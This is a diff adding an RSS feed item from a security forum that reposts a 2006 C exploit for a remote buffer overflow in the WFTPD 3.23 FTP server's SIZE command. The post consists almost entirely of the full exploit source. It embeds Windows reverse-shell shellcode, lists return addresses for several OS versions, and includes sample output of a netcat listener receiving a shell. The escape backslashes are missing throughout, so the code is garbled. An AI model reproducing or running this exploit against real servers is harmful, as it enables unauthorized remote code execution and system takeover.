@@ -1,0 +1,212 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "WFTPD 3.23 (SIZE) Remote Buffer Overflow Exploit"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "WFTPD 3.23 (SIZE) Remote Buffer Overflow Exploit"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>WFTPD 3.23 (SIZE) Remote Buffer Overflow Exploit</title>
+				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+* wftpd_exp.c
+* WFTPD server 3.23 &#40;SIZE&#41; 0day remote buffer overflow exploit
+* coded by h07 &lt;h07@interia.pl&gt; 
+* tested on XP SP2 polish, 2000 SP4 polish
+* example..
+
+C:&gt;wftpd_exp 0 0 192.168.0.2 h07 open 192.168.0.1 4444
+
+&#91;*&#93; WFTPD server 3.23 &#40;SIZE&#41; 0day remote buffer overflow exploit
+&#91;*&#93; coded by h07 &lt;h07@interia.pl&gt;
+&#91;*&#93; FTP response: 331 Give me your password, please
+&#91;*&#93; FTP response: 230 Logged in successfully
+&#91;+&#93; sending buffer: ok
+&#91;*&#93; press enter to quit
+
+C:&gt;nc -l -p 4444
+Microsoft Windows XP &#91;Wersja 5.1.2600&#93;
+&#40;C&#41; Copyright 1985-2001 Microsoft Corp.
+
+C:wftpd323&gt;
+*/
+
+#include &lt;winsock2.h&gt;
+#define BUFF_SIZE 1024
+#define PORT 21
+
+//win32 reverse shellcode &#40;metasploit.com&#41;
+
+char shellcode&#91;&#93; =
+
+"x31xc9x83xe9xb8xd9xeexd9x74x24xf4x5bx81x73x13xb6"
+"x10x92x98x83xebxfcxe2xf4x4ax7ax79xd5x5exe9x6dx67"
+"x49x70x19xf4x92x34x19xddx8ax9bxeex9dxcex11x7dx13"
+"xf9x08x19xc7x96x11x79xd1x3dx24x19x99x58x21x52x01"
+"x1ax94x52xecxb1xd1x58x95xb7xd2x79x6cx8dx44xb6xb0"
+"xc3xf5x19xc7x92x11x79xfex3dx1cxd9x13xe9x0cx93x73"
+"xb5x3cx19x11xdax34x8exf9x75x21x49xfcx3dx53xa2x13"
+"xf6x1cx19xe8xaaxbdx19xd8xbex4exfax16xf8x1ex7exc8"
+"x49xc6xf4xcbxd0x78xa1xaaxdex67xe1xaaxe9x44x6dx48"
+"xdexdbx7fx64x8dx40x6dx4exe9x99x77xfex37xfdx9ax9a"
+"xe3x7ax90x67x66x78x4bx91x43xbdxc5x67x60x43xc1xcb"
+"xe5x53xc1xdbxe5xefx42xf0xb6x10x92x98xd0x78x92x98"
+"xd0x43x1bx79x23x78x7ex61x1cx70xc5x67x60x7ax82xc9"
+"xe3xefx42xfexdcx74xf4xf0xd5x7dxf8xc8xefx39x5ex11"
+"x51x7axd6x11x54x21x52x6bx1cx85x1bx65x48x52xbfx66"
+"xf4x3cx1fxe2x8exbbx39x33xdex62x6cx2bxa0xefxe7xb0"
+"x49xc6xc9xcfxe4x41xc3xc9xdcx11xc3xc9xe3x41x6dx48"
+"xdexbdx4bx9dx78x43x6dx4exdcxefx6dxafx49xc0xfax7f"
+"xcfxd6xebx67xc3x14x6dx4ex49x67x6ex67x66x78x62x12"
+"xb2x4fxc1x67x60xefx42x98";
+
+void config_shellcode&#40;unsigned long ip, unsigned short port&#41;
+  {
+  memcpy&#40;&shellcode&#91;184&#93;, &ip, 4&#41;;
+  memcpy&#40;&shellcode&#91;190&#93;, &port, 2&#41;;  
+  }     
+
+unsigned long target&#91;&#93; = 
+  {
+  0x7d16887b, //JMP ESI &#40;XP SP2 polish&#41;
+  0x776f2015, //JMP ESI &#40;2000 SP4 polish&#41;
+  0x7cb9e082, //JMP ESI &#40;XP SP2 english&#41;
+  0x7848a5f1, //JMP ESI &#40;2000 SP4 english&#41;
+  0x7ca96834  //JMP ESI &#40;XP SP2 german&#41; 
+  };           
+
+char buffer&#91;BUFF_SIZE&#93;;
+
+main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+int sock, id, opt, r_len;
+unsigned long eip;
+unsigned long connectback_IP;
+unsigned short connectback_port;
+struct hostent *he;
+struct sockaddr_in client;
+WSADATA wsa;
+
+printf&#40;"n&#91;*&#93; WFTPD server 3.23 &#40;SIZE&#41; 0day remote buffer overflow exploitn"&#41;;
+printf&#40;"&#91;*&#93; coded by h07 &lt;h07@interia.pl&gt;n"&#41;;  
+
+if&#40;argc &lt; 8&#41;
+  {
+  printf&#40;"&#91;*&#93; usage:..n %s &lt;ID&gt; &lt;opt&gt; &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;connectback_IP&gt; &lt;connectback_port&gt;nn", argv&#91;0&#93;&#41;;
+  printf&#40;"&#91;*&#93; ID list:n"&#41;;
+  printf&#40;"&#91;&gt;&#93; 0: XP SP2 polishn"&#41;;
+  printf&#40;"&#91;&gt;&#93; 1: 2000 SP4 polishn"&#41;;
+  printf&#40;"&#91;&gt;&#93; 2: XP SP2 englishn"&#41;;
+  printf&#40;"&#91;&gt;&#93; 3: 2000 SP4 englishn"&#41;;
+  printf&#40;"&#91;&gt;&#93; 4: XP SP2 germannn"&#41;;
+  printf&#40;"&#91;*&#93; opt - WFTPD option 'restrict to home directory and below'n"&#41;;
+  printf&#40;"&#91;&gt;&#93; 0: disabledn"&#41;;
+  printf&#40;"&#91;&gt;&#93; 1: enablednn"&#41;;
+  printf&#40;"&#91;*&#93; sample: %s 0 0 192.168.0.2 h07 open 192.168.0.1 4444nn", argv&#91;0&#93;&#41;;
+  exit&#40;0&#41;;   
+  } 
+
+WSAStartup&#40;MAKEWORD&#40;2, 0&#41;, &wsa&#41;;
+
+id = atoi&#40;argv&#91;1&#93;&#41;;
+opt = atoi&#40;argv&#91;2&#93;&#41;;
+
+if&#40;&#40;id &gt; 4&#41; || &#40;id &lt; 0&#41;&#41;
+  {
+  printf&#40;"&#91;-&#93; ID error: unknown targetn"&#41;;
+  exit&#40;-1&#41;;     
+  }  
+  
+if&#40;&#40;opt &gt; 1&#41; || &#40;opt &lt; 0&#41;&#41;
+  {
+  printf&#40;"&#91;-&#93; opt error: unknown optionn"&#41;;
+  exit&#40;-1&#41;;      
+  }          
+  
+eip = target&#91;id&#93;;
+connectback_IP = inet_addr&#40;argv&#91;6&#93;&#41; ^ &#40;ULONG&#41;0x989210b6;
+connectback_port = htons&#40;atoi&#40;argv&#91;7&#93;&#41;&#41; ^ &#40;USHORT&#41;0x9892;
+config_shellcode&#40;connectback_IP, connectback_port&#41;;
+
+sock = socket&#40;AF_INET, SOCK_STREAM, IPPROTO_TCP&#41;;
+
+if&#40;&#40;he = gethostbyname&#40;argv&#91;3&#93;&#41;&#41; == NULL&#41;
+  {
+  printf&#40;"&#91;-&#93; Unable to resolven"&#41;;
+  exit&#40;-1&#41;; 
+  }
+ 
+client.sin_addr = *&#40;&#40;struct in_addr *&#41;he-&gt;h_addr&#41;; 
+client.sin_port = htons&#40;PORT&#41;; 
+client.sin_family = AF_INET;   
+
+if&#40;connect&#40;sock, &#40;struct sockaddr *&#41; &client, sizeof&#40;client&#41;&#41; == -1&#41;
+  {
+  printf&#40;"&#91;-&#93; error: connect&#40;&#41;n"&#41;;
+  exit&#40;-1&#41;;
+  }
+
+recv&#40;sock, buffer, BUFF_SIZE -1, 0&#41;; 
+
+//USER
+memset&#40;buffer, 0, BUFF_SIZE&#41;;
+sprintf&#40;buffer, "USER %srn", argv&#91;4&#93;&#41;;
+send&#40;sock, buffer, strlen&#40;buffer&#41;, 0&#41;;  
+recv&#40;sock, buffer, BUFF_SIZE -1, 0&#41;;
+printf&#40;"&#91;*&#93; FTP response: %s", buffer&#41;;
+
+//PASS
+memset&#40;buffer, 0, BUFF_SIZE&#41;;
+sprintf&#40;buffer, "PASS %srn", argv&#91;5&#93;&#41;;
+send&#40;sock, buffer, strlen&#40;buffer&#41;, 0&#41;;  
+recv&#40;sock, buffer, BUFF_SIZE -1, 0&#41;;
+printf&#40;"&#91;*&#93; FTP response: %s", buffer&#41;;
+
+if&#40;strstr&#40;buffer, "530"&#41; != 0&#41; exit&#40;-1&#41;;
+
+//SIZE
+memset&#40;buffer, 0x90, BUFF_SIZE&#41;;
+memcpy&#40;buffer, "SIZE ", 5&#41;;
+
+switch&#40;opt&#41;
+  {
+  case 0:
+    { 
+    memcpy&#40;buffer + 5, "/", 1&#41;;
+    r_len = 531;
+    break;
+    }
+  case 1: 
+    {
+    memcpy&#40;buffer + 5, "//", 2&#41;;
+    r_len = 532;
+    break;
+    }                  
+  }
+
+memcpy&#40;buffer + 7, shellcode, sizeof&#40;shellcode&#41; -1&#41;;          
+*&#40;&#40;unsigned long*&#41;&#40;&buffer&#91;r_len&#93;&#41;&#41; = eip;
+memcpy&#40;buffer + &#40;r_len + 4&#41;, "rnx00", 3&#41;;
+
+
+if&#40;send&#40;sock, buffer, strlen&#40;buffer&#41;, 0&#41; != -1&#41;
+  printf&#40;"&#91;+&#93; sending buffer: okn"&#41;;
+  else
+  printf&#40;"&#91;-&#93; sending buffer: failedn"&#41;;
+    
+printf&#40;"&#91;*&#93; press enter to quitn"&#41;;
+getchar&#40;&#41;;    
+}
+
+//EoF
+
+//</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3034.hva#16989</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3034.hva#16989</link>
+				<pubDate><![CDATA[Tue, 22 Aug 2006 12:54:58]]> GMT</pubDate>
+				<author><![CDATA[ LeonHart]]></author>
+			</item>
+	</channel>
+</rss>
